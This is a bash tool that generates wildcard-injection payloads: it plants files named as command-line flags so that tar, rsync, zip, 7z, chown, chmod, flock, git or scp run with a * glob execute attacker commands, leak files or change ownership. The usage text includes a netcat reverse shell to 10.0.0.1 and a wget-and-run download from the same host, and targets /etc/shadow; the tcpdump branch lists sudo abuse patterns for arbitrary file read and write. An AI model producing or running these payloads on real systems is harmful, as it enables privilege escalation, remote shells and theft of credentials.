#!/bin/bash
# Wildcard Injection Payload Generator
# Usage: ./generate_wildcard_payloads.sh <binary> <target_dir> [options]

set -e

BINARY="$1"
TARGET_DIR="$2"
shift 2

if [[ -z "$BINARY" || -z "$TARGET_DIR" ]]; then
    echo "Usage: $0 <binary> <target_dir> [options]"
    echo ""
    echo "Binaries: tar, rsync, zip, 7z, chown, chmod, tcpdump, flock, git, scp"
    echo ""
    echo "Examples:"
    echo "  $0 tar /tmp/evil --rce '/bin/sh -c \"whoami > /tmp/pwn\"'"
    echo "  $0 rsync /tmp/evil --rsh 'nc -e /bin/sh 10.0.0.1 4444'"
    echo "  $0 zip /tmp/evil --rce 'wget http://10.0.0.1/shell.sh; bash shell.sh'"
    echo "  $0 7z /tmp/evil --exfil '/etc/shadow'"
    echo "  $0 tcpdump /tmp/evil --rce '/tmp/rce.sh'"
    exit 1
fi

mkdir -p "$TARGET_DIR"
cd "$TARGET_DIR"

case "$BINARY" in
    tar)
        if [[ "$1" == "--rce" && -n "$2" ]]; then
            CMD="$2"
            echo "[*] Creating GNU tar checkpoint RCE payload..."
            echo "$CMD" > shell.sh
            chmod +x shell.sh
            touch "--checkpoint=1"
            touch "--checkpoint-action=exec=sh shell.sh"
            echo "[+] Payload created. Trigger with: tar -czf backup.tgz *"
        elif [[ "$1" == "--macos" ]]; then
            echo "[*] Creating macOS/bsdtar payload..."
            touch "--use-compress-program=/bin/sh"
            echo "[+] Payload created. Trigger with: tar -cf backup.tar *"
        else
            echo "Usage: $0 tar <dir> --rce '<command>'"
            echo "       $0 tar <dir> --macos"
            exit 1
        fi
        ;;
    rsync)
        if [[ "$1" == "--rsh" && -n "$2" ]]; then
            RSH_CMD="$2"
            echo "[*] Creating rsync remote shell payload..."
            echo "$RSH_CMD" > shell.sh
            chmod +x shell.sh
            touch "-e sh shell.sh"
            echo "[+] Payload created. Trigger with: rsync -az * user@host:/path/"
        else
            echo "Usage: $0 rsync <dir> --rsh '<command>'"
            exit 1
        fi
        ;;
    zip)
        if [[ "$1" == "--rce" && -n "$2" ]]; then
            CMD="$2"
            echo "[*] Creating zip RCE payload (separate tokens)..."
            touch "-T"
            touch "-TT $CMD"
            touch "dummy.txt"
            echo "[+] Payload created. Trigger with: zip out.zip -T -TT '<cmd>' dummy.txt"
            echo "    Note: Flags must be separate files, not combined"
        else
            echo "Usage: $0 zip <dir> --rce '<command>'"
            exit 1
        fi
        ;;
    7z)
        if [[ "$1" == "--exfil" && -n "$2" ]]; then
            TARGET_FILE="$2"
            echo "[*] Creating 7z file exfiltration payload..."
            ln -sf "$TARGET_FILE" root.txt
            touch "@root.txt"
            echo "[+] Payload created. Trigger with: 7za a backup.7z -- *"
            echo "    Contents of $TARGET_FILE will be printed to stderr"
        else
            echo "Usage: $0 7z <dir> --exfil '<target_file>'"
            exit 1
        fi
        ;;
    chown|chmod)
        if [[ "$1" == "--reference" && -n "$2" ]]; then
            REF_FILE="$2"
            echo "[*] Creating chown/chmod reference payload..."
            touch "--reference=$REF_FILE"
            echo "[+] Payload created. Trigger with: chown/chmod -R <opts> *.ext"
            echo "    All files will inherit ownership/permissions of $REF_FILE"
        else
            echo "Usage: $0 chown|chmod <dir> --reference '<file>'"
            exit 1
        fi
        ;;
    tcpdump)
        if [[ "$1" == "--rce" && -n "$2" ]]; then
            RCE_SCRIPT="$2"
            echo "[*] Creating tcpdump rotation hook payload..."
            echo "    Inject this into the --file-name parameter:"
            echo "    --file-name=\"test -i any -W 1 -G 1 -z $RCE_SCRIPT\""
            echo "    Then send a packet matching the filter to trigger rotation"
        elif [[ "$1" == "--sudoers" ]]; then
            echo "[*] sudoers tcpdump exploitation patterns:"
            echo ""
            echo "Arbitrary write:"
            echo "  sudo tcpdump -c10 -w/constrained/path/ -w /dev/shm/out.pcap -F /path/filter"
            echo ""
            echo "Arbitrary read (leak):"
            echo "  sudo tcpdump -c10 -w/constrained/path/ -V /root/secret.txt -w /tmp/dummy -F /path/filter"
            echo ""
            echo "Root-owned file:"
            echo "  sudo tcpdump -c10 -w/constrained/path/ -Z root -w /dev/shm/root-owned -F /path/filter"
        else
            echo "Usage: $0 tcpdump <dir> --rce '<script_path>'"
            echo "       $0 tcpdump <dir> --sudoers"
            exit 1
        fi
        ;;
    flock)
        if [[ "$1" == "--cmd" && -n "$2" ]]; then
            CMD="$2"
            echo "[*] Creating flock payload..."
            touch "-c $CMD"
            echo "[+] Payload created. Trigger with: flock *.lock"
        else
            echo "Usage: $0 flock <dir> --cmd '<command>'"
            exit 1
        fi
        ;;
    git)
        if [[ "$1" == "--ssh-cmd" && -n "$2" ]]; then
            SSH_CMD="$2"
            echo "[*] Creating git SSH command injection..."
            touch "-c core.sshCommand=$SSH_CMD"
            echo "[+] Payload created. Trigger with git operations over SSH"
        else
            echo "Usage: $0 git <dir> --ssh-cmd '<command>'"
            exit 1
        fi
        ;;
    scp)
        if [[ "$1" == "--ssh" && -n "$2" ]]; then
            SSH_CMD="$2"
            echo "[*] Creating scp SSH replacement..."
            touch "-S $SSH_CMD"
            echo "[+] Payload created. Trigger with: scp * user@host:/path/"
        else
            echo "Usage: $0 scp <dir> --ssh '<command>'"
            exit 1
        fi
        ;;
    *)
        echo "Unknown binary: $BINARY"
        echo "Supported: tar, rsync, zip, 7z, chown, chmod, tcpdump, flock, git, scp"
        exit 1
        ;;
esac

echo ""
echo "Payload files created in: $TARGET_DIR"
ls -la "$TARGET_DIR"
